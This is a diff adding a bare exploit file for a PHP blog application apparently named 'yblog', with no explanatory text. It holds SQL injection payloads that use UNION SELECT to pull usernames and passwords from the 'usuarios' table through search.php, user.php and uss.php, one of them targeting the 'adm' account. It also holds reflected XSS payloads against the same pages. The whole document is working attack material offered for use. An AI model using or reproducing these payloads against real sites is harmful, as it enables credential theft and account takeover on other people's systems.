@@ -1,0 +1,35 @@
+search.php
+
+&lt;form action=&quot;http://www.example.com/yblog/search.php&quot; method=&quot;post&quot;&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;q&quot; value=&quot;&#039; union select 0,1,2,3,usuario,5,6,7,8,9,10,password,12,13,14,15,16 from usuarios/*&quot;&gt;
+  &lt;input type=&quot;submit&quot; value=&quot;send&quot;&gt;
+&lt;/form&gt;
+
+&lt;form action=&quot;http://www.example.com/yblog/search.php&quot; method=&quot;post&quot;&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;cn&quot; value=&quot;1&quot;&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;q&quot; value=&quot;&#039; union select 0,1,2,3,usuario,5,6,7,8,9,10,password,12,13,14,15,16 from usuarios/*&quot;&gt;
+  &lt;input type=&quot;submit&quot; value=&quot;send&quot;&gt;
+&lt;/form&gt;
+
+user.php
+
+http://www.example.com/yblog/user.php?n=-99&#039;+union+select+0,1,2,3,usuario,password,6,7,8,9,10,11,12,13,14,15,16+from+usuarios/*
+
+uss.php
+
+http://www.example.com/yblog/uss.php?action=2&amp;done=1&amp;n=-99&#039;+union+select+0,1,2,usuario,password,5,6,7,8,9,10,11,12,13,14,15,16+from+usuarios+where+usuario=&#039;adm&#039;/*
+
+search.php
+
+&lt;form action=&quot;http://www.example.com/yblog/search.php&quot; method=&quot;post&quot;&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;q&quot; value=&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;&gt;
+  &lt;input type=&quot;submit&quot; value=&quot;send&quot;&gt;
+&lt;/form&gt;
+
+user.php
+
+http://www.example.com/yblog/user.php?n=&lt;script&gt;alert(/xss/)&lt;/script&gt;
+
+uss.php
+
+http://www.example.com/yblog/uss.php?action=2&amp;done=1&amp;n=&lt;script&gt;alert(/xss/)&lt;/script&gt;
